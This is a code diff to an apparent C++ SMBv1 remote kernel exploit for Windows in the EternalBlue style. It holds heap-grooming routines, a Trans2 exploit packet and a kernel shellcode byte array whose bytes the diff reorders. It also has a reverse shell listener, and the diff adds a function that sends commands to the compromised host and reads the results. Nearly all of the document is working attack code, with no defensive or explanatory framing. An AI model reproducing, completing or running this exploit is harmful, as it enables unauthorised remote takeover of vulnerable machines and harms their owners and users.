@@ -358,7 +358,7 @@ public:
         FD_ZERO(&readfds);
         FD_SET(listener, &readfds);
         
-        timeval timeout{20, 0}; // 30 seconds timeout
+        timeval timeout{15, 0}; 
         
         int result = select(0, &readfds, NULL, NULL, &timeout);
         if (result > 0) {
@@ -382,29 +382,62 @@ private:
     void HandleShell(SOCKET client) {
         std::cout << "[+] Handling reverse shell session..." << std::endl;
         
-        // Simple shell handling - just receive and print data
-        char buffer[1024];
+        char buffer[4096];
         int received;
         
-        // Set socket to non-blocking for this demo
-        u_long mode = 1;
+        u_long mode = 0;
         ioctlsocket(client, FIONBIO, &mode);
+        
+        DWORD timeout = 5000;
+        setsockopt(client, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+
+        ExecuteCopyAndRunCommands(client);
         
         auto start = std::chrono::steady_clock::now();
         while (std::chrono::steady_clock::now() - start < std::chrono::seconds(10)) {
             received = recv(client, buffer, sizeof(buffer) - 1, 0);
             if (received > 0) {
                 buffer[received] = '\0';
-                std::cout << "[Shell Output] " << buffer;
+                std::cout << "[Shell] " << buffer;
             } else if (received == 0) {
                 std::cout << "[+] Shell disconnected" << std::endl;
                 break;
             }
             
-            Sleep(100);
+            Sleep(500);
         }
         
         std::cout << "[+] Shell session ended" << std::endl;
+    }
+
+    void ExecuteCopyAndRunCommands(SOCKET client) {
+        char currentPath[MAX_PATH];
+        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+        std::string currentFile = currentPath;
+        
+        std::vector<std::string> commands = {
+            "ls"
+        };
+        
+        for (const auto& cmd : commands) {
+            std::string fullCommand = cmd + "\n"; 
+            int sent = send(client, fullCommand.c_str(), fullCommand.length(), 0);
+            std::cout << "[>>] Sent: " << cmd << " (" << sent << " bytes)" << std::endl;
+            
+            Sleep(150000);
+            char buffer[4096];
+            int received = recv(client, buffer, sizeof(buffer)-1, 0);
+            
+            if (received > 0) {
+                buffer[received] = '\0';
+                std::cout << "[SUCCESS] Response (" << received << " bytes):\n" << buffer << std::endl;
+            } else if (received == 0) {
+                std::cout << "[-] Shell disconnected" << std::endl;
+                return;
+            } else {
+                std::cout << "[-] No response for: " << cmd << std::endl;
+            }
+        }
     }
 };
 
@@ -511,14 +544,16 @@ public:
                 continue; 
             }
 
-            closesocket(fhs_sock);
+            closesocket(fhs_sock); 
+            Sleep(50);
 
             if (!SMB2Grooming(6, payload_hdr_pkt)) { 
                 closesocket(sock); 
                 continue; 
             }
 
-            closesocket(fhf_sock);
+            closesocket(fhf_sock); 
+            Sleep(50);
 
             auto final_exploit = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_EXPLOIT, 15);
             if (!Send(sock, final_exploit.data(), final_exploit.size())) {
@@ -555,12 +590,9 @@ public:
         
             if (gotShell) {
                 std::cout << "[+] Exploit successful! Got reverse shell." << std::endl;
+
                 return true;
             } 
-            else {
-                std::cout << "[-] Exploit may have worked but no shell received" << std::endl;
-                continue;
-            }
         }
 
         return true;
@@ -890,20 +922,20 @@ private:
             0x41, 0x41, 0x41, 0x41, 0x00
         };
         memcpy(echoRequest, echo, sizeof(echo));
-
+        
         unsigned char kernel_payload[] = {
             0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
-            0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x51,
-            0x48, 0x8b, 0x52, 0x18, 0x56, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7,
-            0x4a, 0x4a, 0x48, 0x8b, 0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+            0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
+            0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
+            0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
             0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
-            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
+            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x48, 0x8b, 0x52, 0x20, 0x41, 0x51, 0x8b,
             0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
             0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
-            0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x44, 0x8b,
-            0x40, 0x20, 0x49, 0x01, 0xd0, 0x50, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
-            0x8b, 0x34, 0x88, 0x4d, 0x31, 0xc9, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0,
-            0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
+            0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50,
+            0x49, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d,
+            0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0,
+            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
             0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
             0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
             0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
@@ -1303,11 +1335,6 @@ private:
         for (int i = 0; i < grooms; i++) {
             SOCKET groom_sock = Connect();
             if (groom_sock == INVALID_SOCKET) continue;
-            
-            if (!SendNegotiate(groom_sock)) {
-                closesocket(groom_sock);
-                continue;
-            }
             
             if (!Send(groom_sock, payload_hdr_pkt.data(), payload_hdr_pkt.size())) {
                 closesocket(groom_sock);
